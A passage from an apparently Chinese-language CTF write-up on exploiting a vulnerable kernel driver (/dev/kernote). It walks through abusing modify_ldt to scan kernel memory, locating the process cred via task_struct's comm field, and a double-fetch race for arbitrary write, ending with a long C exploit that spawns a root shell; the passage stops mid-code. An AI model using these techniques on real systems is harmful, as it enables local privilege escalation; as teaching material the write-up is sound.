结构体便在这一块区域内</strong>，只要我们找到本进程的 task_struct，更改 cred 的 uid 为 0，也能够完成提权</p><blockquote><p>物理地址直接映射区即 direct mapping area，即<strong>线性映射区</strong>（不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是<strong>连续的</strong>，kmalloc 便从此处分配内存</p><p>而 vmalloc 则从 vmalloc&#x2F;ioremap space 分配内存，起始地址为 <code>vmalloc_base</code>，这一块区域到物理地址间的映射是<strong>不连续的</strong></p></blockquote><p>这一块区域的起始地址称之为 <code>page_offset_base</code>，其地址为 <code>0xffff888000000000</code>（参见 <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst">这↑里↓</a>），我们从这个地址开始搜索即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(page_offset_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step-II-泄露进程-task-struct-地址"><a href="#Step-II-泄露进程-task-struct-地址" class="headerlink" title="Step II. 泄露进程 task_struct 地址"></a>Step II. 泄露进程 task_struct 地址</h4><p>阅读 <code>task_struct</code> 源码，观察到其主体凭证下方有个特殊的字段 <code>comm</code>：</p><blockquote><p>&#x2F;include&#x2F;linux&#x2F;sched.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>            *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>        *<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个字段便是该进程的名字，且其位置刚好在 cred 附近，我们只需要从 <code>page_offset_base</code> 开始找当前进程的名字便能够找到当前进程的 task_struct</p><p>使用 prctl 系统调用我们可以修改当前进程的 task_struct 的 comm 字段，这样我们便能够更方便地进行查找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwn!&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是我们不能够直接搜索整个线性映射区域，这仍有可能触发 hardened usercopy 的检查，在这里官方给出了一个美妙的解法：</p><p>观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>，因此不会触发 hardened usercopy 的检查，我们只需要在父进程中设定好搜索的地址之后再开子进程来用 read_ldt() 读取数据即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cur_pid = getpid();</span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">search_addr = page_offset_base;</span><br><span class="line">cred_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(search_addr);</span><br><span class="line">    <span class="type">int</span> ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)    <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        signal(SIGSEGV, die);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        result_addr = (<span class="type">size_t</span>*) memmem(buf, <span class="number">0x8000</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (result_addr \</span><br><span class="line">            &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">            &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">            &amp;&amp; (((<span class="type">int</span>) result_addr[<span class="number">-58</span>]) == cur_pid))</span><br><span class="line">        &#123;</span><br><span class="line">            cred_addr = result_addr[<span class="number">-2</span>]; <span class="comment">// task_struct-&gt;cred</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found cred: \033[0m%lx\n&quot;</span>, cred_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (cred_addr)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    search_addr += <span class="number">0x8000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里需要注意一点就是 uid 的类型为 int，笔者因为这个疏忽卡了好一阵子…</p></blockquote><h4 id="Step-III-double-fetch-更改进程-uid-完成提权"><a href="#Step-III-double-fetch-更改进程-uid-完成提权" class="headerlink" title="Step III. double fetch 更改进程 uid 完成提权"></a>Step III. double fetch 更改进程 uid 完成提权</h4><p>在我们获得了 cred 的地址之后，我们只需要将 cred-&gt;euid 更改为 0 就能拥有 root 权限，之后再调用 <code> setreuid ()</code> 等一系列函数完成全面的提权</p><p>现在我们考虑如何在内核空间中进行任意写，这一次我们仍然借助 modify_ldt() 系统调用来达到我们的目的，重新回到 <code>write_ldt()</code> 函数的主体逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到的是，在 memcpy 时所拷贝的字节数为 <code>old_ldt-&gt;nr_entries * LDT_ENTRY_SIZE</code>，其中前者的上限值与后者都定义于 <code>arch/x86/include/uapi/asm/ldt.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure><p>那么这个数据量相对较大，拷贝需要用到一定的时间，而在拷贝结束后有一句 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code>，其中 ldt 为我们传入的数据，我们不难想到的是<strong>可以通过条件竞争的方式在 memcpy 过程中将 new_ldt-&gt;entries 更改为我们的目标地址从而完成任意地址写</strong>，即 double fetch</p><p>在这里为了提高利用的成功率，笔者参照官方题解中使用 <code>sched_setaffinity</code> 将相应的进程绑定到单个 CPU 上（在 run.sh 中定义了两个核），需要注意的是编译时需包含 <code>#define _GNU_SOURCE</code></p><p>在这里<strong>有几个令笔者所不解的点</strong>，目前暂时还没联系上出题人（<del>都过去一个月了谁还看discord啊</del>）：</p><ul><li>在开子进程任意写之前要先将当前的 <code>old_ldt-&gt;entries</code> 设为 <code>cred_addr + 4</code>，不然成功率会大幅下降</li><li>任意写时需先分配 index 为 1~ 15 的 object，并全部释放，选取其中的 <code>index 11</code> 来进行任意写，其他的 index 都会失败，仅分配一个 object 也会失败</li></ul><h4 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h4><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> kernote_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] %s \033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkSet</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6666</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkAdd</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6667</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkDel</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6668</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkEdit</span><span class="params">(<span class="type">size_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6669</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkFuck</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x666A</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">size_t</span>              temp;</span><br><span class="line">    <span class="type">int</span>                 retval;</span><br><span class="line">    <span class="type">size_t</span>                cred_addr;</span><br><span class="line">    <span class="type">size_t</span>                search_addr;</span><br><span class="line">    <span class="type">size_t</span>              per_search_addr;</span><br><span class="line">    <span class="type">size_t</span>              *result_addr;</span><br><span class="line">    <span class="type">int</span>                   cur_pid;</span><br><span class="line">    <span class="type">char</span>                *buf;</span><br><span class="line">    <span class="type">int</span>                 pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">cpu_set_t</span>           cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit... \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    kernote_fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    chunkAdd(<span class="number">0</span>);</span><br><span class="line">    chunkSet(<span class="number">0</span>);</span><br><span class="line">    chunkDel(<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;\033[34m\033[1m[*] now checking: \033[0m%lx\n&quot;, page_offset_base);</span></span><br><span class="line">        chunkEdit(page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">        <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        page_offset_base += <span class="number">0x4000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    cur_pid = getpid();</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line">    cred_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">            result_addr = (<span class="type">size_t</span>*) memmem(buf, <span class="number">0x8000</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">            <span class="keyword">if</span> (result_addr \</span><br><span class="line">                &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (((<span class="type">int</span>) result_addr[<span class="number">-58</span>]) == cur_pid))</span><br><span class="line">            &#123;</span><br><span class="line">                cred_addr = result_addr[<span class="number">-2</span>]; <span class="comment">// task_struct-&gt;cred</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found cred: \033[0m%lx\n&quot;</span>, cred_addr);</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (cred_addr)</span><br><span class="line">            <span 